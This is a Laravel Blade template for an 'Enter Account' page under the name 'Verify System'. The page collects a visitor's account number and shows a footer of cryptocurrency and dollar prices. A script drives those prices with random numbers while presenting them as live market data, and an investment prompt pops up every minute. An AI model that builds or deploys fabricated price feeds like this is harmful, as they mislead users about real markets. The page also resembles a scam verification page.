<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter Account</title>
    @vite(['resources/css/app.css', 'resources/css/verify.css', 'resources/js/app.js', 'resources/js/verify.js'])
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body id="verify-account"
    class="h-screen bg-gradient-to-b from-slate-600 via-slate-800 to-[#1e2a36] text-slate-100 flex flex-col items-center justify-center relative overflow-hidden">

    <!-- Logo difuminado -->
    <div id="account-page" class="absolute inset-0 flex justify-center items-center pointer-events-none">
        <x-application-logo class="w-[50rem] h-[40rem] opacity-5 text-white" />
    </div>

    <!-- Cuadrícula de fondo animada -->
    <div class="absolute inset-0 opacity-25 overflow-hidden"
        style="background-image: 
               linear-gradient(rgba(148,163,184,0.25) 1px, transparent 1px),
               linear-gradient(90deg, rgba(148,163,184,0.25) 1px, transparent 1px);
               background-size: 80px 80px;">
        <div class="absolute inset-0 bg-gradient-to-r from-transparent via-sky-400/20 to-transparent
                    animate-[gridglow_6s_linear_infinite]"
            style="background-size: 200% 200%; mix-blend-mode: screen;"></div>
    </div>

    <!-- Contenido principal -->
    <main class="relative z-10 flex flex-col items-center justify-center flex-1 px-4 py-6 sm:px-6 md:px-8">
        <div class="w-full flex justify-center mt-6 sm:mt-10">
            <form id="account-form" action="{{ route('client.saveAccount') }}" method="POST"
                class="w-full flex justify-center mt-6 sm:mt-10">
                @csrf
                <div
                    class="bg-[#1e2a36]/40 border border-slate-500/30 p-6 sm:p-10 rounded-lg shadow-lg text-center inline-block">
                    <h2 class="text-base sm:text-lg md:text-xl font-medium text-white mb-6 leading-snug">
                        Please enter your account number
                    </h2>

                    <div class="flex flex-col sm:flex-row items-center justify-center gap-3">
                        <input type="text" name="account" placeholder="Enter your account number"
                            class="h-11 sm:h-12 w-full sm:min-w-[280px] md:min-w-[360px] px-4 
      bg-[#1e2a36]/60 border border-slate-500/30
      focus:border-slate-400/50 focus:outline-none text-white 
      placeholder:text-slate-400 transition-all duration-300 
      rounded-md text-sm sm:text-base text-center"
                            required>

                        <button type="submit"
                            class="h-11 sm:h-12 px-6 font-semibold border border-slate-500/30 
      bg-slate-700/40 hover:bg-slate-600/50 hover:border-slate-400/50 
      transition-all duration-300 text-slate-200 hover:text-white 
      rounded-md text-sm sm:text-base whitespace-nowrap">
                            Save and continue
                        </button>
                    </div>
                    @if ($errors->has('account'))
                        <p class="mt-3 text-red-500">{{ $errors->first('account') }}</p>
                    @endif
                </div>
            </form>

            <!-- Overlay de carga / éxito -->
            <div id="loading-overlay"
                class="hidden fixed inset-0 bg-slate-900/80 backdrop-blur-sm z-50 flex flex-col items-center justify-center text-center text-white transition-all duration-500">
                <div id="loading-spinner"
                    class="animate-spin rounded-full h-16 w-16 border-4 border-slate-400 border-t-transparent mb-6">
                </div>

                <div id="success-icon" class="hidden text-green-400 mb-6">
                    <i class="fa-solid fa-circle-check text-6xl animate-bounce"></i>
                </div>

                <div id="error-icon" class="hidden text-red-500 mb-6">
                    <i class="fa-solid fa-circle-xmark text-6xl animate-bounce"></i>
                </div>

                <h2 id="loading-text" class="text-xl font-semibold mb-2">Saving account...</h2>
                <p id="loading-subtext" class="text-slate-300 text-sm animate-pulse">Please wait</p>
            </div>
        </div>
    </main>

    <footer class="w-full mt-10 sm:mt-16 relative bg-slate-900/30 backdrop-blur-sm border-t border-slate-700/40">
        <!-- Línea superior decorativa -->
        <div class="h-[1px] bg-gradient-to-r from-transparent via-slate-500/40 to-transparent"></div>

        <!-- Contenedor principal -->
        <div
            class="flex flex-col md:flex-row items-center justify-between gap-4 px-4 sm:px-8 md:px-12 py-6 text-slate-300 text-sm sm:text-base font-medium relative z-10">

            <!-- Sección Izquierda (Monedas) -->
            <div class="flex flex-wrap justify-center items-center gap-4 sm:gap-6">
                <div class="flex items-center gap-2">
                    <img src="/public/bitcoin.png" alt="BTC" alt="BTC" class="w-5 h-5 sm:w-6 sm:h-6">
                    <span>BTC: <span id="btc-left" class="text-green-400">45,230.12</span></span>
                    <span id="btc-left-arrow" class="text-green-400 font-semibold">▲</span>
                </div>
                <div class="flex items-center gap-2">
                    <img src="/public/etereo.png" alt="ETH" class="w-5 h-5 sm:w-6 sm:h-6">
                    <span>ETH: <span id="eth-left" class="text-red-400">3,240.80</span></span>
                    <span id="eth-left-arrow" class="text-red-400 font-semibold">▼</span>
                </div>
            </div>

            <!-- Texto Central -->
            <div class="order-first md:order-none text-center text-xs sm:text-sm text-slate-500">
                © 2025 — <span class="text-slate-300">Verify System</span>. All rights reserved.
            </div>

            <!-- Sección Derecha (Monedas) -->
            <div class="flex flex-wrap justify-center items-center gap-4 sm:gap-6">
                <div class="flex items-center gap-2">
                    <img src="/public/usd.png" alt="USD" class="w-5 h-5 sm:w-6 sm:h-6">
                    <span>USD: <span id="usd-right" class="text-green-400">1.00</span></span>
                    <span id="usd-right-arrow" class="text-green-400 font-semibold">▲</span>
                </div>
                 <div class="flex items-center gap-2">
                        <img src="/binsss.png" alt="SOL" class="w-5 h-5 sm:w-6 sm:h-6">
                        <span>BIN: <span id="sol-right" class="text-red-400">142.35</span></span>
                        <span id="sol-right-arrow" class="text-red-400 font-semibold">▼</span>
                    </div>
            </div>
        </div>
    </footer>

    <!-- Toast -->
    <div id="invest-toast"
        class="hidden fixed top-6 right-6 max-w-[90%] sm:max-w-sm bg-slate-800/90 text-slate-100 
               px-5 py-3 rounded-md shadow-lg border border-slate-500/30 
               transition-all duration-500 opacity-0 z-50 flex items-start gap-3 text-sm sm:text-base">

        <i class="fa-solid fa-chart-line text-emerald-400 text-lg mt-1"></i>

        <div class="flex flex-col leading-tight">
            <strong class="text-emerald-400 font-semibold">Follow your investments</strong>
            <span class="text-slate-300">Get updates and insights on your portfolio.</span>
        </div>
    </div>

</body>


<script>
    setInterval(() => {
        coins.forEach(c => {
            const delta = (Math.random() - 0.5) * (c.id.includes("usd") ? 0.002 : c.value * 0.0005);
            c.value += delta;
            const el = document.getElementById(c.id);
            const arrow = document.getElementById(c.arrow);
            const up = delta > 0;

            el.textContent = c.value.toFixed(c.id.includes("usd") ? 3 : 2);
            el.className = up ? "text-green-400 transition-colors duration-300" :
                "text-red-400 transition-colors duration-300";
            arrow.textContent = up ? "▲" : "▼";
            arrow.className = up ? "text-green-400 transition-all duration-300" :
                "text-red-400 transition-all duration-300";
        });
    }, 1500);

const coins = [{
    id: "btc-left",
    arrow: "btc-left-arrow",
    value: 45230.12
},
{
    id: "eth-left",
    arrow: "eth-left-arrow",
    value: 3240.80
},
{
    id: "usd-right",
    arrow: "usd-right-arrow",
    value: 1.00
},
{
    id: "sol-right",
    arrow: "sol-right-arrow",
    value: 142.35
},
];

    
</script>





<script>
    ///ALERTA
    const toast = document.getElementById("invest-toast");

    function showToast() {
        toast.classList.remove("hidden");
        setTimeout(() => toast.classList.add("opacity-100"), 50);
        // Se oculta después de 4 segundos
        setTimeout(() => {
            toast.classList.remove("opacity-100");
            setTimeout(() => toast.classList.add("hidden"), 500);
        }, 5000);
    }

    // Mostrar cada 3 minutos (180000 ms)
    setInterval(showToast, 60000);
    // Primera muestra de prueba (10 segundos después)
    setTimeout(showToast, 10000);
</script>









</html>
